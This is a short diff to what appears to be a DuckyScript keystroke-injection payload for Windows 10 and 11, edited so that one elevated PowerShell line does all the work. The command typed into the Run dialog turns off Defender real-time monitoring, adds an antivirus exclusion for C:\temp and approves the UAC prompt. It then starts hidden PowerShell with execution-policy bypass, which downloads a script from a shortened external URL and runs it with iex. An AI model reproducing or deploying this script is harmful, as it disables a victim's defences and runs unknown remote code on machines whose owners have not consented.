@@ -4,14 +4,7 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\temp'"
-CTRL-SHIFT ENTER
-DELAY 1000
-ALT y
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $url='File download link';$extension='exe/jpg/png/pdf/bat/ps1...';irm https://t.ly/IDPkt | iex
+STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\temp'; Start-Sleep -Seconds 5; powershell -w h -NoP -Ep Bypass -Command '$url='File download link';$extension='exe/jpg/png/pdf/bat/ps1...';irm https://t.ly/IDPkt | iex'"
 CTRL-SHIFT ENTER
 DELAY 1000
 ALT y
